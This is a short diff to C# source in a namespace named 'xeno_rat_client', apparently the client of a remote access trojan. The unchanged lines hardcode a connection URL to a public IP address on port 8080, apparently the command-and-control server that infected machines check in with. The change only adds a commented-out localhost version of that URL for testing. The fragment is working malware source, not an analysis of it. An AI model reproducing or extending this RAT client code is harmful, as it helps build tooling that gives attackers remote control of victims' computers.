@@ -164,6 +164,7 @@ namespace xeno_rat_client
             {
                 // TODO修改IP
                 var requestUrl = "http://154.91.65.162:8080/api/connect";
+                //var requestUrl = "http://127.0.0.1:8080/api/connect";
                 var jsonData = new
                 {
                     type = type,
